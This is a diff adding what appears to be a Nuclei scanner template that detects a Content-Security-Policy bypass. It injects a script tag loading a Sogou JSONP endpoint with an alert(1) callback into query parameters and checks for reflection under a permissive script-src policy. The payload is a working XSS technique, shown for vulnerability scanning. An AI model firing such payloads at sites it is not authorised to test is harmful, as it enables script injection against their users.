@@ -1,0 +1,47 @@
+id: sogou-csp-xss
+
+info:
+  name: Content-Security-Policy Bypass via Sogou
+  author: DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/honoki/CSPBypass/blob/c7e4344226a58d96ad16a99d4446f81cd663264e/data.tsv#L210C1-L210C21
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,sogou
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '<script src="https://zhuanjia.sogou.com/base/ajax/login/login-init?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{injection}}"
+
+      - type: word
+        part: content_type
+        words:
+          - "text/html"
+
+      - type: word
+        part: content_security_policy
+        words:
+          - "sogou.com"
+          - "script-src"
+        condition: and
